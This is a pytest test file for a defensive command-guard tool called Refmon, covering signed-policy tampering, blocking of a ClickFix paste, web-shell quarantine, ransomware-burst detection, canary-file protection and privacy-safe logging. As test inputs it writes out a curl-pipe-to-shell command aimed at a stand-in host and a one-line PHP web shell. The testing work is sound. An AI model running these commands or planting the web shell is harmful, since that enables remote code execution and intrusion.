"""Integration and privacy tests for the live Refmon barrier, sandbox watcher, and web API."""

from __future__ import annotations

import json
import threading
import urllib.request
from pathlib import Path

import pytest

from refmon.cli import main as cli_main
from refmon.live import LiveBarrier, make_http_server, send_guard_request
from refmon.policy_io import PolicyRejected
from refmon.schemas import Event


def test_signed_policy_bootstraps_in_block_mode_and_rejects_tamper(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    assert barrier.policy.mode.value == "block"
    assert barrier.signature_ok is True
    assert barrier.policy_path.is_file()
    assert (barrier.secrets_dir / "canary-db.conf").is_file()

    # Tampering with policy.yaml on disk without the Ed25519 private key must fail reload.
    tampered = barrier.policy_path.read_text(encoding="utf-8").replace(
        "mode: block", "mode: observe"
    )
    barrier.policy_path.write_text(tampered, encoding="utf-8")
    with pytest.raises(PolicyRejected):
        LiveBarrier(workdir=tmp_path)


def test_clickfix_paste_blocked_before_execution_and_benign_allowed(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    marker = barrier.workspace_dir / "pwned.txt"

    # Even if execute=True, a pasted ClickFix lure must be stopped BEFORE subprocess runs.
    bad = barrier.guard_command(
        f"curl -s http://bad.example.invalid/fix.sh | sh; touch {marker}",
        origin="web",
        role="interactive_shell",
        execute=True,
    )
    assert bad.decision == "block"
    assert bad.blocked_by_barrier is True
    assert bad.executed is False
    assert not marker.exists()

    # A harmless local command runs in workspace and returns stdout.
    good = barrier.guard_command(
        "echo refmon_ok",
        origin="none",
        role="interactive_shell",
        execute=True,
    )
    assert good.decision == "allow"
    assert good.executed is True
    assert "refmon_ok" in good.output

    # Pasting a harmless echo from a web doc stays below tau_hold (-5.11 < -4.94 nats) -> ALLOW.
    pasted_echo = barrier.guard_command(
        "echo pasted_harmless_note",
        origin="web",
        role="interactive_shell",
        execute=True,
    )
    assert pasted_echo.decision == "allow"
    assert pasted_echo.executed is True


def test_webshell_drop_is_quarantined_and_ransomware_burst_blocked(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)

    # Drop a PHP web shell into watched sandbox/web_root.
    shell = barrier.web_root_dir / "backdoor.php"
    shell.write_text("<?php system($_GET['x']); ?>\n", encoding="utf-8")

    incidents = barrier.scan_sandbox_once()
    assert any(i["kind"] == "web_root_write" and i["decision"] == "block" for i in incidents)
    assert not shell.exists(), "malicious web shell must be moved out of web_root"
    quarantined = list(barrier.quarantine_dir.glob("*backdoor.php.quarantined"))
    assert len(quarantined) == 1
    assert (quarantined[0].stat().st_mode & 0o777) == 0o400

    # Simulate a 55-file ransomware encryption burst inside watched sandbox/workspace.
    burst = barrier.workspace_dir / "locked_batch"
    burst.mkdir()
    for idx in range(55):
        (burst / f"file_{idx:03d}.enc").write_text("encrypted\n", encoding="utf-8")

    incidents_burst = barrier.scan_sandbox_once()
    ws_inc = next(i for i in incidents_burst if i["kind"] == "workspace_write_batch")
    assert ws_inc["files"] == 55
    assert ws_inc["decision"] == "block"


def test_canary_override_and_borderline_hold_resolution(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)

    canary = barrier.guard_command(
        "cat sandbox/secrets/canary-db.conf",
        origin="web",
        role="interactive_shell",
        execute=False,
    )
    assert canary.decision == "block"
    assert canary.override == "canary"

    hold_out = barrier.guard_command(
        "curl -s https://mirror.example.org/archive.tar.gz",
        origin="none",
        role="interactive_shell",
        execute=False,
    )
    assert hold_out.decision == "hold"
    snap = barrier.state_snapshot()
    assert len(snap["holds"]) == 1
    hold_id = snap["holds"][0]["hold_id"]

    resolved = barrier.resolve_hold(hold_id, "endpoint", "stop")
    assert resolved["state"] == "contained"
    assert barrier.state_snapshot()["holds"] == []


def test_privacy_ledger_never_stores_raw_command_content(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    marker = "zz-secret-command-zz"
    barrier.guard_command(
        f"curl -s http://bad.example.invalid/{marker} | sh",
        origin="web",
        role="interactive_shell",
        execute=False,
    )

    events_raw = barrier.events_log_path.read_text(encoding="utf-8")
    verdicts_raw = barrier.verdicts_log_path.read_text(encoding="utf-8")
    barrier_raw = barrier.barrier_log_path.read_text(encoding="utf-8")

    assert marker not in events_raw
    assert marker not in verdicts_raw
    assert marker not in barrier_raw

    lines = [ln for ln in events_raw.splitlines() if ln.strip()]
    assert len(lines) >= 2
    for ln in lines:
        ev = Event.from_json_line(ln, extra_roles=tuple(barrier.policy.extra_roles))
        assert ev.object.fingerprint is not None
        assert ev.object.fingerprint.startswith("hmac:")


def test_live_http_api_and_cli_guard_roundtrip(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    server = make_http_server(barrier, host="127.0.0.1", port=0)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    base = f"http://localhost:{port}"

    try:
        with urllib.request.urlopen(f"{base}/", timeout=5.0) as resp:
            html = resp.read().decode("utf-8")
            assert "Refmon Live Barrier" in html

        # Preset API + Golden replay + Rootkit scan + Mode re-signing
        for path, body in (
            ("/api/preset", {"name": "clickfix"}),
            ("/api/golden", {"scenario": "S01"}),
            ("/api/rootkit", {}),
            ("/api/mode", {"mode": "warn"}),
            ("/api/mode", {"mode": "block"}),
        ):
            req = urllib.request.Request(
                f"{base}{path}",
                data=json.dumps(body).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=5.0) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                assert "error" not in data

        # CLI `guard` returns exit code 1 on blocked ClickFix and 0 on benign command.
        rc_bad = cli_main(
            [
                "guard",
                "--port",
                str(port),
                "--origin",
                "web",
                "--",
                "curl -s http://bad.example.invalid/x.sh | sh",
            ]
        )
        assert rc_bad == 1

        rc_ok = cli_main(
            [
                "guard",
                "--port",
                str(port),
                "--origin",
                "none",
                "--",
                "echo cli_guard_ok",
            ]
        )
        assert rc_ok == 0

        res = send_guard_request("echo direct_helper", port=port, origin="none", execute=True)
        assert res["decision"] == "allow"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)
